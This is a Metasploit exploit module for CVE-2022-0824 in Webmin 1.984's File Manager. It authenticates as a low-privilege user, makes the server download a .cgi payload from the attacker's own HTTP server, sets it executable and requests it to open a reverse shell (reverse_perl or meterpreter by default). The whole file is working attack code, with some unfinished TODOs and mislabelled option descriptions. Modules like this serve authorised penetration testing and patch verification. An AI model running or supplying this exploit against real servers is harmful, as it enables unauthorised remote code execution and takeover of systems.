##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  #TODO: ensure all the includes are being used
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Webmin File Manager RCE',
        'Description' => %q{
          In Webmin version 1.984, affecting File Manager module, any authenticated low privilege user without access rights to
          the File Manager module could interact with file manager functionalities such as download file from remote URL and
          change file permission. It is possible to achieve Remote Code Execution via a crafted .cgi file by chaining those
          functionalities in the file manager.
        },
        'Author' => [
          'test', # discovery
          'jheysel-r7' # module
        ],
        'References' => [
          [ 'URL', 'https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell'], # exploit
          [ 'CVE', '2022-0824']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Privileged' => false,
        'Targets'        =>
          [
            ['Automatic (Unix In-Memory)',
             {
               'Platform' => 'unix',
               'Arch'  => ARCH_CMD,
               'Type'  => :unix_memory,
               'DefaultOptions'  => {'PAYLOAD' => 'cmd/unix/reverse_perl'}
             }
            ],
            ['Automatic (Linux Dropper)',
             {
               'Platform' => 'linux',
               'Arch'  => [ARCH_X86, ARCH_X64, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_ARMLE, ARCH_AARCH64],
               'Type'  => :linux_dropper,
               'DefaultOptions'  => {'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'}
             }
            ]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2022-03-06' # double check
      )
    )

    register_options(
      [
        OptRhosts.new('RHOSTS', [true, 'The default webmin port', '']),
        OptString.new('LHOST', [true, 'The default webmin port', '']),
        OptPort.new('RPORT', [true, 'The default webmin port', 10000]),
        OptString.new('USERNAME', [ true, 'The username to authenticate as', '' ]),
        OptString.new('PASSWORD', [ true, 'The password for the specified username', '' ])
      ]
    )
  end

  # TODO: Move copy pasta'd check method to webmin mixin?
  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    )

    return CheckCode::Unknown("#{peer} - Could not connect to web service - no response") unless res

    if res.body.include?('This web server is running in SSL mode.')
      return CheckCode::Unknown("#{peer} - Please enable the SSL option to proceed")
    end

    version = res.headers['Server'].to_s.scan(%r{MiniServ/([\d.]+)}).flatten.first

    return CheckCode::Unknown("#{peer} - Webmin version not detected") unless version

    version = Rex::Version.new(version)

    vprint_status("Webmin #{version} detected")

    unless version <= Rex::Version.new('1.984')
      return CheckCode::Safe("#{peer} - Webmin #{version} is not a supported target")
    end

    vprint_good("Webmin #{version} is a supported target")

    CheckCode::Appears
  rescue ::Rex::ConnectionError
    return CheckCode::Unknown("#{peer} - Could not connect to web service")
  end

  # TODO: Move copy pasta'd login method to webmin mixin?
  def login
    print_status('Attempting to authenticate with Webmin')
    res = send_request_cgi({
                             'method' => 'POST',
                             'uri' => normalize_uri(datastore['TARGETURI'], 'session_login.cgi'),
                             'cookie' => 'testing=1', # it must be used for "Error - No cookies"
                             'keep_cookies' => true,
                             'vars_post' => {
                               'page' => '',
                               'user' => datastore['USERNAME'],
                               'pass' => datastore['PASSWORD']
                             }
                           })

    if res && res.code == 302 && res.get_cookies =~ /sid=(\w+)/
      print_good("Authentication successful")
      return ::Regexp.last_match(1)
    end

    return nil unless res

    ''
  end

  def download_remote_url
    print_status('Fetching payload from HTTP server')

    #TODO: change back to send_request_cgi, chagned to raw when debugging
    res = send_request_raw({
                             'uri' => normalize_uri(datastore['TARGETURI'], '/extensions/file-manager/http_download.cgi?module=filemin'),
                             'method' => 'POST',
                             'cookie' => "sid=#{@cookie}",
                             'data' => 'link=' + get_uri + '.cgi' + '&username=&password=&path=%2Fusr%2Fshare%2Fwebmin',
                             'headers' => {
                               'Accept' => 'application/json, text/javascript, */*; q=0.01',
                               'Accept-Encoding' => 'gzip, deflate',
                               'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                               'X-Requested-With' => 'XMLHttpRequest',
                               'Referer' => 'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + '/filemin/?xnavigation=1'
                             }
                           })

    fail_with(Failure::UnexpectedReply, 'Unable to download .cgi payload from http server') unless res
    fail_with(Failure::UnexpectedReply, "please properly configure the http server, it could not be found by webmin") if res.body.include?("Error: No valid URL supplied!")

  end

  def modify_permissions
    print_status('Modifying the permissions of the uploaded payload to 0755')
    res = send_request_cgi({
                             'uri' => normalize_uri(target_uri.path, '/extensions/file-manager/chmod.cgi?module=filemin&page=1&paginate=30'),
                             'method' => 'POST',
                             'keep_cookies' => true,
                             'headers' => {
                               'Referer' =>  'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + '+' 'filemin/?xnavigation=1'
                             },
                             'vars_post' => {
                               'name' => @file_name,
                               'perms' => '0755',
                               'applyto' => '1',
                               'path' => '/usr/share/webmin'
                             }
                           })

    # TODO: add more detailed error handling
    fail_with(Failure::UnexpectedReply, 'Unable to modify permissions on the upload .cgi payload') unless res
  end

  def exec_revshell
    res = send_request_cgi(
      'method' => 'GET',
      'keep_cookies' => true,
      'uri' => normalize_uri(datastore['TARGETURI'], @file_name),
      'headers' => {
        'Connection' => 'keep-alive'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Unable to execute the .cgi payload') unless res && res.code == 500
  end

  def on_request_uri(cli, request)
    print_status("Request '#{request.method} #{request.uri}'")
    print_status('Sending payload ...')
    send_response(cli, payload.encoded,
                  'Content-Type' => 'application/octet-stream')
  end

  def exploit
    start_service
    @file_name =  (get_resource.gsub('/', '') + '.cgi')
    #TODO: Remove instance variable cookie and just use keep-cookies => true
    @cookie = login
    fail_with(Failure::BadConfig, 'Unsucessful login attempt with creds') if @cookie.empty?
    print_status('Downloading remote url')
    download_remote_url
    print_status('Finished downloading remote url')
    modify_permissions
    exec_revshell
  end
end
